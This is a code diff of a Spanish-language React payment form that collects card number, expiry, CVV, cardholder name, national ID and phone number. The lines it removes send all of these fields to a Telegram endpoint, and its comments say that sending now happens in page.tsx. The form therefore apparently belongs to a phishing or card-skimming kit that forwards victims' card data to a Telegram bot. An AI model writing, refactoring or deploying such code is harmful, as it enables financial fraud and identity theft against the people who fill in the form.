@@ -138,40 +138,19 @@ export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, o
     return Object.keys(newErrors).length === 0
   }
 
-  // ✅ Solo valida y llama a onSubmit — el envío a Telegram lo maneja page.tsx
-  const handleSubmit = async () => {
+  // ✅ Solo valida y pasa los datos — Telegram se maneja en page.tsx
+  const handleSubmit = () => {
     if (!validate()) return
     setIsSubmitting(true)
 
-    const cardData: CardData = {
+    onSubmit({
       numero_tarjeta: cardNumber,
       vencimiento: expiry,
       cvv,
       titular,
       dni,
       tipo_tarjeta: cardType || "desconocida",
-    }
-
-    try {
-      const res = await fetch("/api/telegram", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          telefono,
-          monto: amount,
-          ...cardData,
-        }),
-      })
-
-      if (!res.ok) {
-        const err = await res.json()
-        console.error("Telegram error:", err)
-      }
-    } catch (err) {
-      console.error("Fetch error:", err)
-    }
-
-    onSubmit(cardData)
+    })
   }
 
   return (
